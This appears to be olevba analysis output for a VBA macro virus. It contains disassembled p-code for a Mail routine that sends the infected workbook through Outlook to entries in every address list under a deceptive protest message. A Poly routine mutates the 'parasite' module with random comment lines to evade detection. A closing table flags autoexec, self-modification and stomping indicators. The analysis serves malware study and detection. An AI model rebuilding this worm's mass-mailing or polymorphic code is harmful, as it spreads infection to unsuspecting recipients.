' Line #92:
' 	EndSub 
' Line #93:
' Line #94:
' 	FuncDefn (Sub Mail())
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' Line #97:
' 	ArgsCall Read 0x0000 
' Line #98:
' Line #99:
' 	QuoteRem 0x0000 0x002C "lots o variables ---------------------------"
' Line #100:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set outapp 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld outapp 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set mapname 
' Line #101:
' 	SetStmt 
' 	Ld AddressLists 
' 	Set al 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld Count 
' 	Set cnt 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld Logoff 
' 	Set lo 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld Application 
' 	Set aeck 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld Attachments 
' 	Set adacwb 
' Line #102:
' 	SetStmt 
' 	Ld Subject 
' 	Set sj 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld Body 
' 	Set bdy 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld send 
' 	Set Snd 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld ActiveWorkbook 
' 	Set awb 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld FullName 
' 	Set fn 
' Line #103:
' 	SetStmt 
' 	Ld Logon 
' 	Set lgon 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld CreateItem 
' 	Set citm 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld UserName 
' 	Set usnm 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Outlook"
' 	St oln4 
' Line #104:
' 	QuoteRem 0x0000 0x002C "--------------------------------------------"
' Line #105:
' Line #106:
' 	LitDI2 0x0000 
' 	Ld aeck 
' 	MemSt EnableCancelKey 
' Line #107:
' Line #108:
' 	Ld outapp 
' 	Ld oln4 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld mapname 
' 	ArgsMemCall lgon 0x0002 
' 	EndIf 
' Line #109:
' Line #110:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mapname 
' 	MemLd al 
' 	MemLd cnt 
' 	For 
' Line #111:
' 	LitDI2 0x0001 
' 	St mailoop 
' Line #112:
' Line #113:
' 	SetStmt 
' 	Ld y 
' 	Ld mapname 
' 	ArgsMemLd al 0x0001 
' 	Set addlist 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld outapp 
' 	ArgsMemLd citm 0x0001 
' 	Set psite 
' Line #114:
' Line #115:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld addlist 
' 	MemLd al 
' 	MemLd cnt 
' 	For 
' Line #116:
' Line #117:
' Line #118:
' 	Label one 
' Line #119:
' 	Ld mailoop 
' 	Ld addlist 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St vi 
' Line #120:
' 	GoTo two 
' Line #121:
' 	Label three 
' Line #122:
' 	Ld mailoop 
' 	LitDI2 0x0001 
' 	Add 
' 	St mailoop 
' Line #123:
' 	Ld mailoop 
' 	LitDI2 0x0028 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld addlist 
' 	MemLd al 
' 	MemLd cnt 
' 	St z 
' 	EndIf 
' Line #124:
' 	GoTo four 
' Line #125:
' 	Label two 
' Line #126:
' 	Ld vi 
' 	Ld psite 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #127:
' 	GoTo three 
' Line #128:
' 	Label four 
' Line #129:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	NextVar 
' Line #130:
' Line #131:
' 	LitStr 0x0014 "Lets make this work!"
' 	Ld psite 
' 	MemSt sj 
' Line #132:
' 	LitStr 0x0081 "Are you sick and tired of Microsoft products bugs? Lets unite and protest. Fill up the attached form and send to ms-trial@doj.gov"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld aeck 
' 	MemLd usnm 
' 	Add 
' 	Ld psite 
' 	MemSt bdy 
' Line #133:
' 	Ld awb 
' 	MemLd fn 
' 	Ld psite 
' 	MemLd adacwb 
' 	ArgsMemCall Add 0x0001 
' Line #134:
' 	Ld psite 
' 	ArgsMemCall Snd 0x0000 
' Line #135:
' Line #136:
' 	LitStr 0x0000 ""
' 	St vi 
' Line #137:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #138:
' Line #139:
' 	Ld mapname 
' 	ArgsMemCall lo 0x0000 
' Line #140:
' Line #141:
' 	EndSub 
' Line #142:
' Line #143:
' 	FuncDefn (Sub Poly())
' Line #144:
' 	QuoteRem 0x0000 0x0020 "poly from jackie /MVT . tnx man!"
' Line #145:
' 	OnError (Resume Next) 
' Line #146:
' 	SetStmt 
' 	Ld MacroContainer 
' 	Set Current 
' Line #147:
' Line #148:
' 	StartForVariable 
' 	Ld ploop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	For 
' Line #149:
' 	LitStr 0x0008 "parasite"
' 	Ld vbext_pk_Proc 
' 	LitStr 0x0008 "parasite"
' 	Ld Current 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Number 
' Line #150:
' 	ArgsLd Rnd 0x0000 
' 	Ld Number 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St RandomLine 
' Line #151:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0028 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St rl 
' Line #152:
' Line #153:
' 	StartForVariable 
' 	Ld cl 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld rl 
' 	For 
' Line #154:
' 	Ld rb 
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St rb 
' Line #155:
' 	StartForVariable 
' 	Ld cl 
' 	EndForVariable 
' 	NextVar 
' Line #156:
' Line #157:
' 	Ld RandomLine 
' 	Ld vbTab 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld rb 
' 	Concat 
' 	LitStr 0x0008 "parasite"
' 	Ld Current 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #158:
' 	LitStr 0x0000 ""
' 	St rb 
' Line #159:
' 	StartForVariable 
' 	Ld ploop 
' 	EndForVariable 
' 	NextVar 
' Line #160:
' Line #161:
' 	EndSub 
' Line #162:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |dosstart.bat        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

